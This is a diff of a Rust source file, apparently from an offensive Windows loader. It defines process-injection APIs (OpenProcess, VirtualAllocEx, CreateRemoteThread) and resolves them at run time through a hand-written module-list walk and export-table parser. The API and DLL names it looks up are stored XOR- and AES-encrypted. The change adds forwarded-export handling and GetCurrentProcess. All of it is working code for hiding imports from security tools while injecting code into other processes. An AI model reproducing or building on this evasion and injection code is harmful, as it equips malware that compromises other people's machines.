@@ -4,32 +4,36 @@
 
 use crate::consts::*;
 use crate::crypto_util::*;
-use crate::util::str_len;
+use crate::util::{print_buffer_as_string, print_buffer_as_string_utf16, str_len};
+use crate::windows::apiset::API_SET_NAMESPACE_V6;
+use crate::windows::ntdll::*;
 use std::arch::asm;
+use std::ffi::{c_char, CStr, CString};
 use std::mem::size_of;
 use std::ptr::addr_of;
-use crate::windows::ntdll::*;
+use std::{mem, slice};
+use std::str::Utf8Error;
 
 //KERNEL32.DLL
 pub type LoadLibraryA = unsafe extern "system" fn(lpLibFileName: *const u8) -> usize;
 pub type GetLastError = unsafe extern "system" fn() -> u32;
 pub type GetProcAddress = unsafe extern "system" fn(hModule: usize, lpProcName: *const u8) -> usize;
 pub type FindResourceA =
-unsafe extern "system" fn(hModule: usize, lpName: usize, lptype: usize) -> usize;
+    unsafe extern "system" fn(hModule: usize, lpName: usize, lptype: usize) -> usize;
 pub type LoadResource = unsafe extern "system" fn(hModule: usize, hResInfo: usize) -> usize;
 pub type LockResource = unsafe extern "system" fn(hResData: usize) -> *const u8;
 pub type SizeofResource = unsafe extern "system" fn(hModule: usize, hResInfo: usize) -> u32;
 pub type CreateToolhelp32Snapshot =
-unsafe extern "system" fn(dwFlags: u32, th32ProcessID: u32) -> usize;
+    unsafe extern "system" fn(dwFlags: u32, th32ProcessID: u32) -> usize;
 pub type Process32First =
-unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool;
+    unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool;
 pub type Process32Next =
-unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool;
+    unsafe extern "system" fn(hSnapshot: usize, lppe: *mut PROCESSENTRY32) -> bool;
 pub type CloseHandle = unsafe extern "system" fn(hObject: usize) -> bool;
 pub type OpenProcess =
-unsafe extern "system" fn(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId: u32) -> usize;
+    unsafe extern "system" fn(dwDesiredAccess: u32, bInheritHandle: u32, dwProcessId: u32) -> usize;
 pub type NtFlushInstructionCache =
-unsafe extern "system" fn(hProcess: usize, lpBaseAddress: usize, dwSize: u32);
+    unsafe extern "system" fn(hProcess: usize, lpBaseAddress: usize, dwSize: u32);
 pub type VirtualAllocEx = unsafe extern "system" fn(
     hProcess: usize,
     lpAddress: usize,
@@ -66,7 +70,9 @@ pub type CreateRemoteThread = unsafe extern "system" fn(
     lpThreadId: *mut u32,
 ) -> usize;
 pub type WaitForSingleObject =
-unsafe extern "system" fn(hProcess: usize, dwMilliseconds: u32) -> u32;
+    unsafe extern "system" fn(hProcess: usize, dwMilliseconds: u32) -> u32;
+
+pub type GetCurrentProcess = unsafe extern "system" fn() -> usize;
 
 pub const PROCESS_TERMINATE: u32 = 0x0001;
 pub const PROCESS_CREATE_THREAD: u32 = 0x0002;
@@ -175,18 +181,16 @@ pub unsafe fn GetModuleHandle(sModuleName: Vec<u8>) -> usize {
         let pEntry = (pListEntry as usize - size_of::<LIST_ENTRY>()) as *const LDR_DATA_TABLE_ENTRY;
 
         // Debug code for printing out module names.
-        // let buff = std::slice::from_raw_parts(
+        // print_buffer_as_string_utf16(
         //     (*pEntry).BaseDllName.Buffer,
         //     ((*pEntry).BaseDllName.Length / 2) as usize,
         // );
-        // let str = String::from_utf16(buff).unwrap();
-        // println!("{}", str);
 
         if &sModuleNameW[..]
             == std::slice::from_raw_parts(
-            (*pEntry).BaseDllName.Buffer,
-            ((*pEntry).BaseDllName.Length / 2) as usize,
-        )
+                (*pEntry).BaseDllName.Buffer,
+                ((*pEntry).BaseDllName.Length / 2) as usize,
+            )
         {
             return (*pEntry).DllBase;
         }
@@ -232,12 +236,40 @@ pub unsafe fn GetProcAddress(hMod: usize, sProcName: &[u8]) -> usize {
             let string_ptr = (pBaseAddr + pFuncNameTblArray[i] as usize) as *const u8;
 
             let len = str_len(string_ptr, MAX_PATH);
+
+            // Debug code for printing out module names.
+            // if cfg!(test) {
+            //     print_buffer_as_string(string_ptr, len);
+            // }
+
             if sProcName == std::slice::from_raw_parts(string_ptr, len) {
                 let pHintsTblArray =
                     std::slice::from_raw_parts(pHintsTbl, (*pExportDirAddr).NumberOfNames as usize);
                 pProcAddr = pBaseAddr + pEATArray[pHintsTblArray[i] as usize] as usize;
             }
         }
+    }
+
+    if pProcAddr >= pExportDirAddr as usize
+        && pProcAddr < pExportDirAddr as usize + (*pExportDataDir).Size as usize
+    {
+        let mut sFwdDll = match CStr::from_ptr(pProcAddr as *const c_char).to_str() {
+            Ok(s) => s.to_string(),
+            Err(_) => return 0,
+        };
+        let split_pos = match sFwdDll.find(".") {
+            Some(s) => s + 1,
+            None => return 0,
+        };
+        sFwdDll = sFwdDll.replace(".", "\0");
+
+        let hFwd = LoadLibraryA(sFwdDll.as_ptr());
+        if hFwd == 0 {
+            return 0;
+        }
+
+        let sFwdFunction = CStr::from_ptr((pProcAddr + split_pos) as *const c_char);
+        pProcAddr = GetProcAddress(hFwd, sFwdFunction.to_bytes());
     }
 
     pProcAddr
@@ -293,7 +325,7 @@ pub unsafe fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> usiz
             CREATETOOLHELP32SNAPSHOT_POS,
             CREATETOOLHELP32SNAPSHOT_LEN,
         )
-            .as_slice(),
+        .as_slice(),
     ));
 
     createToolhelp32Snapshot(dwFlags, th32ProcessID)
@@ -442,8 +474,6 @@ pub unsafe fn WaitForSingleObject(hProcess: usize, dwMilliseconds: u32) -> u32 {
     waitForSingleObject(hProcess, dwMilliseconds)
 }
 
-
-
 pub unsafe fn GetLastError() -> u32 {
     let getLastError: GetLastError = std::mem::transmute(GetProcAddress(
         GetModuleHandle(get_xor_encrypted_string(
@@ -455,4 +485,17 @@ pub unsafe fn GetLastError() -> u32 {
     ));
 
     getLastError()
+}
+
+pub unsafe fn GetCurrentProcess() -> usize {
+    let getCurrentProcess: GetCurrentProcess = std::mem::transmute(GetProcAddress(
+        GetModuleHandle(get_xor_encrypted_string(
+            KERNEL32_DLL_POS,
+            KERNEL32_DLL_KEY,
+            KERNEL32_DLL_LEN,
+        )),
+        get_aes_encrypted_resource_bytes(GETCURRENTPROCESS_POS, GETCURRENTPROCESS_LEN).as_slice(),
+    ));
+
+    getCurrentProcess()
 }
